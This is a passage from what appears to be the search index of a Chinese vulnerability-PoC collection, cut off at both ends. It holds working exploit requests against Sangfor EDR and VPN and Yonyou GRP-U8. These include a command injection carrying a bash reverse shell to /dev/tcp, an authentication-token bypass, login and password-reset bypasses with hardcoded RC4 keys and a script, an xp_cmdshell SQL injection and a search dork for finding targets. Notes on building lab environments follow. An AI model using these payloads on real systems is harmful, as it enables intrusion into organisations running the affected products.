\u6587\u4ef6 \u5b58\u5728\u4efb\u610f\u6307\u4ee4\u6267\u884c\u6f0f\u6d1e.\u4f5c\u8005\u8bd5\u56fe\u4f7f\u7528escapeshellarg\u51fd\u6570\u53bb\u7ed9\u5355\u5f15\u53f7\u6253\u53cd\u659c\u6760\u5b9e\u9645\u4e0a\u662f\u6beb\u65e0\u4f5c\u7528\u7684. \u7ed5\u8fc7: {\"params\":\"w=123\\\"'1234123'\\\"|\u547d\u4ee4\"} \u7ed3\u679c\u5982\u4e0b: \u8fd4\u56de: POC``` POST /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9 HTTP/1.1 Host: xx.x.x.x Connection: close Accept-Encoding: gzip, deflate Accept: / User-Agent: python-requests/2.22.0 Content-Length: 77 {\"params\": \"w=123\\\"'1234123'\\\"|bash -i >& /dev/tcp/ip/port 0>&1\"} ```","title":"\u6df1\u4fe1\u670dEDR \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c-2020-hvv2"},{"location":"%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2020-hvv2/#_1","text":"\u53d7\u5f71\u54cd\u7248\u672c\u4e3a3.2.17R1, 3.2.21\u4e24\u4e2a\u7248\u672c\uff0c\u5982\u679c\u4e3a\u8fd9\u4e24\u4e2a\u7248\u672c\u5efa\u8bae\u5347\u7ea7\u7248\u672c\u81f3 3.2.21.375","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2020-hvv2/#_2","text":"dev_linkage_launch.php \u4e3a\u8bbe\u5907\u8054\u52a8\u7684\u65b0\u5165\u53e3\u70b9\u4e3b\u8981\u662f\u5c06\u8054\u52a8\u7684\u63a5\u53e3\u6784\u9020\u6210\u4e1a\u52a1\u7edf\u4e00\u5904\u7406\u7684\u63a5\u53e3 \u4e3b\u8981\u8c03\u7528 \u8ddf\u8fdb \u53ef\u4ee5\u770b\u5230 \u7b2c\u4e00\u4e2a\u68c0\u67e5\u4e3a \u7ed5\u8fc7\u7b2c\u4e00\u4e2a\u68c0\u67e5: \u5728\u4ed6\u4eec\u7cfb\u7edfnginx\u914d\u7f6e\u6587\u4ef6\u91cc\u9762: \u901a\u8fc7nginx\u89c4\u5219\u53ef\u4ee5\u5f97\u77e5,\u4ed6\u4eec\u6ca1\u6709\u8bbe\u7f6e\u7981\u6b62\u5916\u7f51\u8bbf\u95ee.\u4ece\u800c\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee /api/edr/sangforinter/v2/xxx \u7ed5\u8fc7 \u7b2c\u4e00\u4e2a\u68c0\u67e5 \u7b2c\u4e8c\u68c0\u67e5: \u6743\u9650\u68c0\u67e5 \u8ddf\u8fdbcheck_access_token \u8fd9\u91cc \u5f15\u53d1\u7b2c\u4e8c\u4e2a\u6f0f\u6d1e: php\u5f31\u7c7b\u578b\u5bfc\u81f4\u7684\u6f0f\u6d1e \u7ed5\u8fc7\u53ea\u9700\u8981\u4f20\u5165\u4e00\u4e2abase64\u7f16\u7801\u7684json\u5185\u5bb9\u4e3a{\"md5\":true}\u5373\u53ef \u81f3\u6b64 \u6743\u9650\u68c0\u67e5\u7ed5\u8fc7\u5b8c\u6bd5 \u6765\u5230 process_cssp.php \u6587\u4ef6 \u5b58\u5728\u4efb\u610f\u6307\u4ee4\u6267\u884c\u6f0f\u6d1e.\u4f5c\u8005\u8bd5\u56fe\u4f7f\u7528escapeshellarg\u51fd\u6570\u53bb\u7ed9\u5355\u5f15\u53f7\u6253\u53cd\u659c\u6760\u5b9e\u9645\u4e0a\u662f\u6beb\u65e0\u4f5c\u7528\u7684. \u7ed5\u8fc7: {\"params\":\"w=123\\\"'1234123'\\\"|\u547d\u4ee4\"} \u7ed3\u679c\u5982\u4e0b: \u8fd4\u56de: POC``` POST /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9 HTTP/1.1 Host: xx.x.x.x Connection: close Accept-Encoding: gzip, deflate Accept: / User-Agent: python-requests/2.22.0 Content-Length: 77 {\"params\": \"w=123\\\"'1234123'\\\"|bash -i >& /dev/tcp/ip/port 0>&1\"} ```","title":"\u6f0f\u6d1e\u539f\u7406"},{"location":"%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 EDR 3.2.16\u30013.2.17\u30013.2.19 \u6f0f\u6d1ePOC \u00b6 \u53c2\u6570host/path/row/limit=\u547d\u4ee4 \u5373\u53ef\u6267\u884c\u547d\u4ee4 https://*****/tool/log/c.php?strip_slashes=system&host=id https://*****/tool/log/c.php?strip_slashes=system&path=id https://*****/tool/log/c.php?strip_slashes=system&row=id https://*****/tool/log/c.php?strip_slashes=system&limit=id","title":"\u6df1\u4fe1\u670dEDR\u4efb\u610f\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","text":"EDR 3.2.16\u30013.2.17\u30013.2.19","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#poc","text":"\u53c2\u6570host/path/row/limit=\u547d\u4ee4 \u5373\u53ef\u6267\u884c\u547d\u4ee4 https://*****/tool/log/c.php?strip_slashes=system&host=id https://*****/tool/log/c.php?strip_slashes=system&path=id https://*****/tool/log/c.php?strip_slashes=system&row=id https://*****/tool/log/c.php?strip_slashes=system&limit=id","title":"\u6f0f\u6d1ePOC"},{"location":"%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 EDR <=3.2.19 \u6f0f\u6d1ePOC \u00b6 user=\u4efb\u610f\u7528\u6237\u540d\u5373\u53ef\u767b\u5f55\uff08\u7528\u6237\u540d\u5b58\u5728\uff09\uff1a https://******/ui/login.php?user=admin","title":"\u6df1\u4fe1\u670dEDR\u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e"},{"location":"%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#_1","text":"EDR <=3.2.19","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#poc","text":"user=\u4efb\u610f\u7528\u6237\u540d\u5373\u53ef\u767b\u5f55\uff08\u7528\u6237\u540d\u5b58\u5728\uff09\uff1a https://******/ui/login.php?user=admin","title":"\u6f0f\u6d1ePOC"},{"location":"%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E4%BB%BB%E6%84%8F%E4%BF%AE%E6%94%B9%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 M7.6.1 \u6f0f\u6d1ePOC \u00b6 https://127.0.0.1/por/changetelnum.csp?apiversion=1 POST\uff1a newtel=TARGET_PHONE&sessReq=clusterd&username=TARGET_USERNAME&grpid=0&sessid=0&ip=127.0.0.1 \u6574\u4f53\u5982\u4e0b\uff1a","title":"\u6df1\u4fe1\u670dVPN\u4efb\u610f\u4fee\u6539\u7ed1\u5b9a\u624b\u673a"},{"location":"%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E4%BB%BB%E6%84%8F%E4%BF%AE%E6%94%B9%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA/#_1","text":"M7.6.1","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E4%BB%BB%E6%84%8F%E4%BF%AE%E6%94%B9%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA/#poc","text":"https://127.0.0.1/por/changetelnum.csp?apiversion=1 POST\uff1a newtel=TARGET_PHONE&sessReq=clusterd&username=TARGET_USERNAME&grpid=0&sessid=0&ip=127.0.0.1 \u6574\u4f53\u5982\u4e0b\uff1a","title":"\u6f0f\u6d1ePOC"},{"location":"%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 \u5df2\u77e5M7.6.6R1 M7.6.1 \u5176\u4ed6\u7248\u672c\u6709\u5f85\u6d4b\u8bd5 \u6f0f\u6d1ePOC \u00b6 M7.6.6R1 key \u4e3a 20181118 M7.6.1 key \u4e3a 20100720``` https:// /por/changepwd.csp sessReq=clusterd&sessid=0&str=RC4_STR&len=RC4_STR_LEN `````` \u8ba1\u7b97RC4_STR_LEN\u811a\u672c from Crypto.Cipher import ARC4 from binascii import a2b_hex def myRC4(data,key): rc41 = ARC4.new(key) encrypted = rc41.encrypt(data) return encrypted.encode('hex') def rc4_decrpt_hex(data,key): rc41 = ARC4.new(key) return rc41.decrypt(a2b_hex(data)) key = '20100720' data = r',username=TARGET_USERNAME,ip=127.0.0.1,grpid=1,pripsw=suiyi,newpsw=TARGET_PASSWORD,' print myRC4(data, key) ```","title":"\u6df1\u4fe1\u670dVPN\u4efb\u610f\u5bc6\u7801\u91cd\u7f6e"},{"location":"%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/#_1","text":"\u5df2\u77e5M7.6.6R1 M7.6.1 \u5176\u4ed6\u7248\u672c\u6709\u5f85\u6d4b\u8bd5","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/#poc","text":"M7.6.6R1 key \u4e3a 20181118 M7.6.1 key \u4e3a 20100720``` https:// /por/changepwd.csp sessReq=clusterd&sessid=0&str=RC4_STR&len=RC4_STR_LEN `````` \u8ba1\u7b97RC4_STR_LEN\u811a\u672c from Crypto.Cipher import ARC4 from binascii import a2b_hex def myRC4(data,key): rc41 = ARC4.new(key) encrypted = rc41.encrypt(data) return encrypted.encode('hex') def rc4_decrpt_hex(data,key): rc41 = ARC4.new(key) return rc41.decrypt(a2b_hex(data)) key = '20100720' data = r',username=TARGET_USERNAME,ip=127.0.0.1,grpid=1,pripsw=suiyi,newpsw=TARGET_PASSWORD,' print myRC4(data, key) ```","title":"\u6f0f\u6d1ePOC"},{"location":"%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20GRP-u8%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 GRP-u8 \u6f0f\u6d1ePOC \u00b6 POST /Proxy HTTP/1.1 Accept: Accept: */* Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;) Host: host Content-Length: 357 Connection: Keep-Alive Cache-Control: no-cache cVer=9.8.0&dp=<?xml version=\"1.0\" encoding=\"GB2312\"?><R9PACKET version=\"1\"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format=\"text\">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format=\"text\">exec xp_cmdshell 'ipconfig'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>","title":"\u7528\u53cb GRP-u8\u6ce8\u5165\u6f0f\u6d1e"},{"location":"%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20GRP-u8%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","text":"GRP-u8","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20GRP-u8%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","text":"POST /Proxy HTTP/1.1 Accept: Accept: */* Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;) Host: host Content-Length: 357 Connection: Keep-Alive Cache-Control: no-cache cVer=9.8.0&dp=<?xml version=\"1.0\" encoding=\"GB2312\"?><R9PACKET version=\"1\"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format=\"text\">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format=\"text\">exec xp_cmdshell 'ipconfig'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>","title":"\u6f0f\u6d1ePOC"},{"location":"%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8BGRP-U8%E8%A1%8C%E6%94%BF%E4%BA%8B%E4%B8%9A%E5%86%85%E6%8E%A7%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u4fe1\u606f: \u00b6 \u7528\u53cb\u516c\u53f8\u6210\u7acb\u4e8e1988\u5e74\uff0c\u5168\u9762\u63d0\u4f9b\u5177\u6709\u81ea\u4e3b\u77e5\u8bc6\u4ea7\u6743\u7684\u4f01\u4e1a\u7ba1\u7406/ERP\u8f6f\u4ef6\u3001\u670d\u52a1\u4e0e\u89e3\u51b3\u65b9\u6848\uff0c\u662f\u4e2d\u56fd\u6700\u5927\u7684\u7ba1\u7406\u8f6f\u4ef6\u3001ERP\u8f6f\u4ef6\u3001\u96c6\u56e2\u7ba1\u7406\u8f6f\u4ef6\u3001\u4eba\u529b\u8d44\u6e90\u7ba1\u7406\u8f6f\u4ef6\u3001\u5ba2\u6237\u5173\u7cfb\u7ba1\u7406\u8f6f\u4ef6\u53ca\u5c0f\u578b\u4f01\u4e1a\u7ba1\u7406\u8f6f\u4ef6\u63d0\u4f9b\u5546\u3002\u5176GRP-U8\u884c\u653f\u4e8b\u4e1a\u5185\u63a7\u7ba1\u7406\u8f6f\u4ef6\u7279\u5b9a\u7248\u672c\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\uff0c\u53ef\u7528\u4e8e\u547d\u4ee4\u6267\u884c\u6267\u884c\u3002 \u6f0f\u6d1e\u590d\u73b0: \u00b6 fofa_dork: \u201c\u7528\u53cbGRP-u8\u201d POC: \u00b6 ``` POST /Proxy HTTP/1.1 Accept: Accept: / Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;) Host: host Content-Length: 357 Connection: Keep-Alive Cache-Control: no-cache cVer=9.8.0&dp=<?xml version=\"1.0\" encoding=\"GB2312\"?> XML AS_DataRequest ProviderName DataSetProviderData Data exec xp_cmdshell 'net user' ```\u8f93\u51famd5\u503c\uff0c\u7528\u4e8epoc\u9a8c\u8bc1\uff1a \u4f7f\u7528MSSQL xp_cmdshell\u6267\u884c\u547d\u4ee4 \u4fee\u590d\u65b9\u6848: \u00b6 \u8054\u7cfb\u7528\u53cb\u5b98\u65b9\u83b7\u5f97\u5b89\u5168\u5347\u7ea7\u65b9\u6848","title":"\u7528\u53cbGRP-U8\u884c\u653f\u4e8b\u4e1a\u5185\u63a7\u7ba1\u7406\u8f6f\u4ef6SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8BGRP-U8%E8%A1%8C%E6%94%BF%E4%BA%8B%E4%B8%9A%E5%86%85%E6%8E%A7%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","text":"\u7528\u53cb\u516c\u53f8\u6210\u7acb\u4e8e1988\u5e74\uff0c\u5168\u9762\u63d0\u4f9b\u5177\u6709\u81ea\u4e3b\u77e5\u8bc6\u4ea7\u6743\u7684\u4f01\u4e1a\u7ba1\u7406/ERP\u8f6f\u4ef6\u3001\u670d\u52a1\u4e0e\u89e3\u51b3\u65b9\u6848\uff0c\u662f\u4e2d\u56fd\u6700\u5927\u7684\u7ba1\u7406\u8f6f\u4ef6\u3001ERP\u8f6f\u4ef6\u3001\u96c6\u56e2\u7ba1\u7406\u8f6f\u4ef6\u3001\u4eba\u529b\u8d44\u6e90\u7ba1\u7406\u8f6f\u4ef6\u3001\u5ba2\u6237\u5173\u7cfb\u7ba1\u7406\u8f6f\u4ef6\u53ca\u5c0f\u578b\u4f01\u4e1a\u7ba1\u7406\u8f6f\u4ef6\u63d0\u4f9b\u5546\u3002\u5176GRP-U8\u884c\u653f\u4e8b\u4e1a\u5185\u63a7\u7ba1\u7406\u8f6f\u4ef6\u7279\u5b9a\u7248\u672c\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\uff0c\u53ef\u7528\u4e8e\u547d\u4ee4\u6267\u884c\u6267\u884c\u3002","title":"\u6f0f\u6d1e\u4fe1\u606f:"},{"location":"%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8BGRP-U8%E8%A1%8C%E6%94%BF%E4%BA%8B%E4%B8%9A%E5%86%85%E6%8E%A7%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_2","text":"fofa_dork: \u201c\u7528\u53cbGRP-u8\u201d","title":"\u6f0f\u6d1e\u590d\u73b0:"},{"location":"%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8BGRP-U8%E8%A1%8C%E6%94%BF%E4%BA%8B%E4%B8%9A%E5%86%85%E6%8E%A7%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","text":"``` POST /Proxy HTTP/1.1 Accept: Accept: / Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;) Host: host Content-Length: 357 Connection: Keep-Alive Cache-Control: no-cache cVer=9.8.0&dp=<?xml version=\"1.0\" encoding=\"GB2312\"?> XML AS_DataRequest ProviderName DataSetProviderData Data exec xp_cmdshell 'net user' ```\u8f93\u51famd5\u503c\uff0c\u7528\u4e8epoc\u9a8c\u8bc1\uff1a \u4f7f\u7528MSSQL xp_cmdshell\u6267\u884c\u547d\u4ee4","title":"POC:"},{"location":"%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8BGRP-U8%E8%A1%8C%E6%94%BF%E4%BA%8B%E4%B8%9A%E5%86%85%E6%8E%A7%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_3","text":"\u8054\u7cfb\u7528\u53cb\u5b98\u65b9\u83b7\u5f97\u5b89\u5168\u5347\u7ea7\u65b9\u6848","title":"\u4fee\u590d\u65b9\u6848:"},{"location":"%E7%99%BD%E9%98%81-%E7%8E%AF%E5%A2%83%E5%BA%93/Centos7%E4%B8%8B%E5%AE%89%E8%A3%85Docker%E5%92%8CVulhub/","text":"Strusts2\u6f0f\u6d1e\u73af\u5883\u642d\u5efa \u00b6 \u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-08-24 20:54:10 \u8be5\u6587\u7ae0\u4e8e\u4ee5\u4e0b\u73af\u5883\u6d4b\u8bd5\u6709\u6548 \u00b6 \u7cfb\u7edf\u73af\u5883\uff1acentos7 java\u73af\u5883\uff1a1.8.0 tomcat\u73af\u5883\uff1a7.0.105 struts2\u73af\u5883\uff1a2.3.2 1.\u5b89\u88c5java \u00b6 yum -y install java-1.8.0-openjdk Copy 2.\u5b89\u88c5tomcat \u00b6 \u4e0b\u8f7dtomcat tomcat\u4e0b\u8f7d\u5730\u5740 \u4e0b\u8f7d\u540e\u89e3\u538b tar -zxvf apache-tomcat-7.0.105.tar.gz Copy 3.\u5b89\u88c5strust2 \u00b6 \u4e0b\u8f7dstruts2 \u94fe\u63a5: \u767e\u5ea6\u4e91\u76d8 \u63d0\u53d6\u7801: ycb3 \u5c06apps\u4e0b\u7684\u6240\u6709\u793a\u4f8b\uff08.war\uff09\u62f7\u8d1d\u5230tomcat\u8def\u5f84\u4e0b\uff08\u8def\u5f84\u4e3a /tomcat\u76ee\u5f55/webapps/ \uff09 4.\u542f\u52a8tomcat\u670d\u52a1 \u00b6 \u8fdb\u5165tomcat bin\u76ee\u5f55\u4e0b\uff0c sh start.sh \u6216\u8005 ./start.sh","title":"Strusts2\u6f0f\u6d1e\u73af\u5883\u642d\u5efa"},{"location":"%E7%99%BD%E9%98%81-%E7%8E%AF%E5%A2%83%E5%BA%93/Centos7%E4%B8%8B%E5%AE%89%E8%A3%85Docker%E5%92%8CVulhub/#strusts2","text":"\u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-08-24 20:54:10","title":"Strusts2\u6f0f\u6d1e\u73af\u5883\u642d\u5efa"},{"location":"%E7%99%BD%E9%98%81-%E7%8E%AF%E5%A2%83%E5%BA%93/Centos7%E4%B8%8B%E5%AE%89%E8%A3%85Docker%E5%92%8CVulhub/#_1","text":"\u7cfb\u7edf\u73af\u5883\uff1acentos7 java\u73af\u5883\uff1a1.8.0 tomcat\u73af\u5883\uff1a7.0.105 struts2\u73af\u5883\uff1a2.3.2","title":"\u8be5\u6587\u7ae0\u4e8e\u4ee5\u4e0b\u73af\u5883\u6d4b\u8bd5\u6709\u6548"},{"location":"%E7%99%BD%E9%98%81-%E7%8E%AF%E5%A2%83%E5%BA%93/Centos7%E4%B8%8B%E5%AE%89%E8%A3%85Docker%E5%92%8CVulhub/#1java","text":"yum -y install java-1.8.0-openjdk Copy","title":"1.\u5b89\u88c5java"},{"location":"%E7%99%BD%E9%98%81-%E7%8E%AF%E5%A2%83%E5%BA%93/Centos7%E4%B8%8B%E5%AE%89%E8%A3%85Docker%E5%92%8CVulhub/#2tomcat","text":"\u4e0b\u8f7dtomcat tomcat\u4e0b\u8f7d\u5730\u5740 \u4e0b\u8f7d\u540e\u89e3\u538b tar -zxvf apache-tomcat-7.0.105.tar.gz Copy","title":"2.\u5b89\u88c5tomcat"},{"location":"%E7%99%BD%E9%98%81-%E7%8E%AF%E5%A2%83%E5%BA%93/Centos7%E4%B8%8B%E5%AE%89%E8%A3%85Docker%E5%92%8CVulhub/#3strust2","text":"\u4e0b\u8f7dstruts2 \u94fe\u63a5: \u767e\u5ea6\u4e91\u76d8 \u63d0\u53d6\u7801: ycb3 \u5c06apps\u4e0b\u7684\u6240\u6709\u793a\u4f8b\uff08.war\uff09\u62f7\u8d1d\u5230tomcat\u8def\u5f84\u4e0b\uff08\u8def\u5f84\u4e3a /tomcat\u76ee\u5f55/webapps/ \uff09","title":"3.\u5b89\u88c5strust2"},{"location":"%E7%99%BD%E9%98%81-%E7%8E%AF%E5%A2%83%E5%BA%93/Centos7%E4%B8%8B%E5%AE%89%E8%A3%85Docker%E5%92%8CVulhub/#4tomcat","text":"\u8fdb\u5165tomcat bin\u76ee\u5f55\u4e0b\uff0c sh start.sh \u6216\u8005 ./start.sh","title":"4.\u542f\u52a8tomcat\u670d\u52a1"},{"location":"%E7%99%BD%E9%98%81-%E7%8E%AF%E5%A2%83%E5%BA%93/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","text":"EmpireCMS\u5404\u7248\u672c\u6f0f\u6d1e\u73af\u5883\u642d\u5efa \u00b6 \u6d4b\u8bd5\u73af\u5883 \u00b6 Windows10 \u5bb6\u5ead\u7248 phpstudy\u96c6\u6210Apache2.4.39 PHP5.6.9 MySql5.7.26 \u6f0f\u6d1e\u73af\u5883\u642d\u5efa \u00b6 1.\u4e0b\u8f7dEmpireCMS\u5b89\u88c5\u5305\uff08\u6309\u7167\u6240\u9700\u7248\u672c\u4e0b\u8f7d\uff09 \u00b6 \u4e0b\u8f7d\u5730\u5740\uff1ahttp://www.phome.net/download/ 2.\u5c06 \u5b89\u88c5\u5305upload\u76ee\u5f55\u4e0b\u6240\u6709\u6587\u4ef6\u653e\u5165\u7f51\u7ad9\u6839\u76ee\u5f55 \u00b6 3.\u6d4f\u89c8\u5668\u8bbf\u95ee\u5b89\u88c5\u811a\u672c \u00b6 \u5730\u5740\uff1ahttp://127.0.0.1/e/install/index.php 4.\u63a5\u4e0b\u6765\u6309\u7167\u63d0\u793a\u4e00\u6b65\u4e00\u6b65\u5b89\u88c5\u5373\u53ef \u00b6","title":"EmpireCMS\u5404\u7248\u672c\u6f0f\u6d1e\u73af\u5883\u642d\u5efa"},{"location":"%E7%99%BD%E9%98%81-%E7%8E%AF%E5%A2%83%E5%BA%93/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#empirecms","text":"","title":"EmpireCMS\u5404\u7248\u672c\u6f0f\u6d1e\u73af\u5883\u642d\u5efa"},{"location":"%E7%99%BD%E9%98%81-%E7%8E%AF%E5%A2%83%E5%BA%93/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#_1","text":"Windows10 \u5bb6\u5ead\u7248 phpstudy\u96c6\u6210Apache2.4.39 PHP5.6.9 MySql5.7.26","title":"\u6d4b\u8bd5\u73af\u5883"},{"location":"%E7%99%BD%E9%98%81-%E7%8E%AF%E5%A2%83%E5%BA%93/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#_2","text":"","title":"\u6f0f\u6d1e\u73af\u5883\u642d\u5efa"},{"location":"%E7%99%BD%E9%98%81-%E7%8E%AF%E5%A2%83%E5%BA%93/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#1empirecms","text":"\u4e0b\u8f7d\u5730\u5740\uff1ahttp://www.phome.net/download/","title":"1.\u4e0b\u8f7dEmpireCMS\u5b89\u88c5\u5305\uff08\u6309\u7167\u6240\u9700\u7248\u672c\u4e0b\u8f7d\uff09"},{"location":"%E7%99%BD%E9%98%81-%E7%8E%AF%E5%A2%83%E5%BA%93/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#2-upload","text":"","title":"2.\u5c06 \u5b89\u88c5\u5305upload\u76ee\u5f55\u4e0b\u6240\u6709\u6587\u4ef6\u653e\u5165\u7f51\u7ad9\u6839\u76ee\u5f55"},{"location":"%E7%99%BD%E9%98%81-%E7%8E%AF%E5%A2%83%E5%BA%93/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#3","text":"\u5730\u5740\uff1ahttp://127.0.0.1/e/install/index.php","title":"3.\u6d4f\u89c8\u5668\u8bbf\u95ee\u5b89\u88c5\u811a\u672c"},{"location":"%E7%99%BD%E9%98%81-%E7%8E%AF%E5%A2%83%E5%BA%93/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#4","text":"","title":"4.\u63a5\u4e0b\u6765\u6309\u7167\u63d0\u793a\u4e00\u6b65\u4e00\u6b65\u5b89\u88c5\u5373\u53ef"},{"location":"%E7%99%BD%E9%98%81-%E7%8E%AF%E5%A2%83%E5%BA%93/Strusts2%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","text":"","title":"Strusts2\u6f0f\u6d1e\u73af\u5883\u642d\u5efa"},{"location":"%E7%99%BD%E9%98%81-%E7%8E%